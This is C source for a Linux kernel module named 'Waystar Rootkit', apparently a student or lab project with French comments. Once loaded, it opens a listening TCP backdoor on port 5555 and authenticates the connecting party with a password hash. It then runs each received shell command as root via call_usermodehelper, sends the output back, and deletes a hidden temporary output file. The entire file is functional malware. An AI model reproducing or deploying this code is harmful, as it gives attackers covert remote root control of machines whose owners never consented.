#include <crypto/hash.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/namei.h>
#include <linux/net.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Corentin Dupaigne & Valentin Mougin");
MODULE_DESCRIPTION("Waystar Rootkit");
MODULE_VERSION("0.1");

static char attacker_ip[16] = {0}; // Will store the first connecting IP
static int attacker_port = 5555;
static char *password_sha256 =
    "dd58add07f93b3ad6ffcebf0fbacf16a15260793cae2f8b00a5fe701d8d85676";
static int ip_detected = 0; // Flag to indicate if we've detected an attacker IP
module_param(attacker_port, int, 0444);
MODULE_PARM_DESC(attacker_port, "Attacker VM TCP port");
module_param(password_sha256, charp, 0400);
MODULE_PARM_DESC(password_sha256,
                 "SHA-256 hash of the authentication password (hex string)");

#define CMD_MAX_LEN 1024
#define OUT_FILE "/tmp/.waystar_out"

static struct task_struct *conn_thread;
static struct socket *conn_sock;

/*
 * Vérifie si le mot de passe fourni correspond au hash SHA-256 attendu.
 *
 * @param input Le mot de passe en clair fourni par l'utilisateur.
 * @return 1 si le mot de passe est valide, 0 sinon.
 */
static int check_password(const char *input)
{
    struct shash_desc *shash;
    struct crypto_shash *tfm;
    unsigned char result[32];
    char hex_result[65];
    int i;

    tfm = crypto_alloc_shash("sha256", 0, 0);
    if (IS_ERR(tfm))
        return -1;

    shash = kmalloc(sizeof(*shash) + crypto_shash_descsize(tfm), GFP_KERNEL);
    if (!shash)
    {
        crypto_free_shash(tfm);
        return -1;
    }

    shash->tfm = tfm;
    shash->flags = 0;
    crypto_shash_digest(shash, input, strlen(input), result);

    kfree(shash);
    crypto_free_shash(tfm);

    for (i = 0; i < 32; i++)
        sprintf(hex_result + i * 2, "%02x", result[i]);
    hex_result[64] = '\0';

    return strncmp(hex_result, password_sha256, 64) == 0;
}

/*
 * Envoie exactement `len` octets via le socket spécifié.
 *
 * @param sock Le socket de destination.
 * @param buf Le tampon contenant les données à envoyer.
 * @param len La taille des données à envoyer.
 * @return 0 en cas de succès, -1 en cas d'erreur.
 */
static int sock_send_all(struct socket *sock, const void *buf, size_t len)
{
    struct msghdr msg = {};
    struct kvec iov = { (void *)buf, len };
    return kernel_sendmsg(sock, &msg, &iov, 1, len) < 0 ? -1 : 0;
}

/*
 * Reçoit exactement `len` octets depuis le socket spécifié.
 *
 * @param sock Le socket source.
 * @param buf Le tampon où stocker les données reçues.
 * @param len Le nombre d'octets à recevoir.
 * @return Nombre total d'octets reçus, ou valeur <= 0 en cas d'erreur.
 */
static int sock_recv_all(struct socket *sock, void *buf, size_t len)
{
    struct msghdr msg = {};
    struct kvec iov;
    int ret, rec = 0;

    while (rec < len)
    {
        iov.iov_base = buf + rec;
        iov.iov_len = len - rec;
        ret = kernel_recvmsg(sock, &msg, &iov, 1, iov.iov_len, 0);
        if (ret <= 0)
            return ret;
        rec += ret;
    }
    return rec;
}

/*
 * Exécute une commande shell en espace utilisateur, redirige la sortie
 * vers un fichier temporaire, puis renvoie le contenu du fichier via le socket.
 *
 * @param cmd La commande shell à exécuter.
 * @return Le code de retour de `call_usermodehelper`, ou erreur mémoire si
 * échec allocation.
 */
static int execute_and_capture(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/", "PATH=/bin:/usr/bin", NULL };
    mm_segment_t oldfs;
    struct file *f;
    loff_t pos = 0;
    char *out_buf;
    int ret;

    argv[2] = kmalloc(strlen(cmd) + 128, GFP_KERNEL);
    if (!argv[2])
        return -ENOMEM;

    snprintf(argv[2], strlen(cmd) + 128,
             "%s > " OUT_FILE " 2>&1; echo EXIT=$? >> " OUT_FILE, cmd);

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    oldfs = get_fs();
    set_fs(KERNEL_DS);
    f = filp_open(OUT_FILE, O_RDONLY, 0);
    if (!IS_ERR(f))
    {
        loff_t size = i_size_read(file_inode(f));
        size_t read_len = min_t(size_t, size, CMD_MAX_LEN);

        out_buf = kmalloc(read_len, GFP_KERNEL);
        if (out_buf)
        {
            vfs_read(f, out_buf, read_len, &pos);
            {
                uint32_t net_len = htonl(read_len);
                sock_send_all(conn_sock, &net_len, sizeof(net_len));
                sock_send_all(conn_sock, out_buf, read_len);
            }
            kfree(out_buf);
        }
        filp_close(f, NULL);
    }
    set_fs(oldfs);
    kfree(argv[2]);

    {
        struct path p;
        if (kern_path(OUT_FILE, LOOKUP_FOLLOW, &p) == 0)
        {
            vfs_unlink(d_inode(p.dentry->d_parent), p.dentry, NULL);
            path_put(&p);
        }
    }

    return ret;
}

/*
 * Fonction principale exécutée dans le thread du rootkit.
 * Crée un socket d'écoute, accepte les connexions entrantes,
 * s'authentifie, puis boucle pour recevoir et exécuter des commandes à distance.
 * La première IP qui se connecte est considérée comme l'IP de l'attaquant.
 *
 * @param data Non utilisé (NULL).
 * @return 0 à la fin du thread, ou un code d'erreur.
 */
static int connection_worker(void *data)
{
    struct sockaddr_in addr;
    struct socket *listen_sock = NULL;
    struct socket *accept_sock = NULL;
    int ret;
    char *cmd;

    cmd = kmalloc(CMD_MAX_LEN + 1, GFP_KERNEL);
    if (!cmd)
        return -ENOMEM;

    while (!kthread_should_stop())
    {
        // Create listening socket
        ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &listen_sock);
        if (ret < 0)
        {
            pr_err("[Waystar] sock_create failed: %d\n", ret);
            goto retry;
        }

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on all interfaces
        addr.sin_port = htons(attacker_port);

        // Bind to the port
        ret = kernel_bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr));
        if (ret < 0)
        {
            pr_err("[Waystar] bind failed: %d\n", ret);
            sock_release(listen_sock);
            goto retry;
        }

        // Start listening
        ret = kernel_listen(listen_sock, 1);
        if (ret < 0)
        {
            pr_err("[Waystar] listen failed: %d\n", ret);
            sock_release(listen_sock);
            goto retry;
        }

        pr_info("[Waystar] Listening on port %d\n", attacker_port);

        // Accept incoming connection
        ret = kernel_accept(listen_sock, &accept_sock, 0);
        if (ret < 0)
        {
            pr_err("[Waystar] accept failed: %d\n", ret);
            sock_release(listen_sock);
            goto retry;
        }

        // Get client address
        {
            int addrlen = sizeof(addr);
            ret = kernel_getpeername(accept_sock, (struct sockaddr *)&addr, &addrlen);
            if (ret < 0)
            {
                pr_err("[Waystar] getpeername failed: %d\n", ret);
                sock_release(accept_sock);
                sock_release(listen_sock);
                goto retry;
            }
        }

        // Store the first connecting IP if not already detected
        if (!ip_detected)
        {
            snprintf(attacker_ip, 16, "%pI4", &addr.sin_addr);
            ip_detected = 1;
            pr_info("[Waystar] Attacker IP detected: %s\n", attacker_ip);
        }

        pr_info("[Waystar] Connection from %pI4:%d\n", &addr.sin_addr,
                ntohs(addr.sin_port));

        // We don't need the listening socket anymore
        sock_release(listen_sock);

        // Use the accepted socket for communication
        conn_sock = accept_sock;

        {
            uint32_t net_len;
            int plen;

            if (sock_recv_all(conn_sock, &net_len, sizeof(net_len)) <= 0)
                goto disconnect;
            plen = ntohl(net_len);
            if (plen <= 0 || plen > CMD_MAX_LEN)
                goto disconnect;
            if (sock_recv_all(conn_sock, cmd, plen) <= 0)
                goto disconnect;
            cmd[plen] = '\0';

            if (!check_password(cmd))
            {
                pr_warn("[Waystar] Wrong password.\n");
                goto disconnect;
            }
            pr_info("[Waystar] Authenticated successfully.\n");

            // Send a success response (1 byte) to indicate successful authentication
            {
                char success_response = 1;
                ret = sock_send_all(conn_sock, &success_response, 1);
                if (ret < 0) {
                    pr_err("[Waystar] Failed to send authentication response: %d\n", ret);
                    goto disconnect;
                }
                pr_info("[Waystar] Authentication response sent successfully.\n");
            }
        }

        while (!kthread_should_stop())
        {
            uint32_t net_len;
            int len;

            len = sock_recv_all(conn_sock, &net_len, sizeof(net_len));
            if (len <= 0)
                break;

            len = ntohl(net_len);
            if (len <= 0 || len > CMD_MAX_LEN)
                break;

            if (sock_recv_all(conn_sock, cmd, len) <= 0)
                break;
            cmd[len] = '\0';

            pr_info("[Waystar] Exec: %s\n", cmd);
            execute_and_capture(cmd);
        }

    disconnect:
        sock_release(conn_sock);

    retry:
        ssleep(5);
    }

    kfree(cmd);
    return 0;
}

/*
 * Fonction d'initialisation du module Waystar.
 * Démarre le thread de communication avec l’attaquant.
 *
 * @return 0 si le module est chargé avec succès, ou un code d'erreur.
 */
static int __init waystar_init(void)
{
    pr_info("[Waystar] Initializing rootkit thread...\n");
    conn_thread = kthread_run(connection_worker, NULL, "waystar_conn");
    if (IS_ERR(conn_thread))
    {
        pr_err("[Waystar] Thread start failed\n");
        return PTR_ERR(conn_thread);
    }
    pr_info("[Waystar] Module loaded.\n");
    return 0;
}

/*
 * Fonction de nettoyage du module Waystar.
 * Termine le thread de communication et libère les ressources.
 */
static void __exit waystar_exit(void)
{
    pr_info("[Waystar] Stopping rootkit thread...\n");
    if (conn_thread)
        kthread_stop(conn_thread);
    if (conn_sock)
        sock_release(conn_sock);
    pr_info("[Waystar] Module unloaded.\n");
}

module_init(waystar_init);
module_exit(waystar_exit);
